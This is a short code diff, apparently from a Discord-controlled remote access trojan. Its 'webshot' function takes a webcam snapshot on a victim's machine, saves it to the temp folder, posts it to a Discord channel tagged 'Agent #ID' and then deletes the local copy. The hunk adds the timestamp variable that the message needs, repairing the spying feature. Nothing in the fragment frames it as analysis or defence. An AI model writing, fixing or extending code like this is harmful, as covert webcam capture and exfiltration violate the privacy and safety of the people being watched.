@@ -276,6 +276,7 @@ async def webshot(context):
             current_time = datetime.now()
             path = os.environ["temp"] +"\\p.png"
             imwrite(path, frame)
+            now = datetime.now()
             await channel.send(f"**Agent #{ID}** | Webcam snapshot `{now.strftime('%d/%m/%Y %H:%M:%S')}`", file=discord.File(path))
             os.remove(path)
             my_embed = discord.Embed(title=f"Got webcam snapshot from Agent#{ID}", color=0x00FF00)
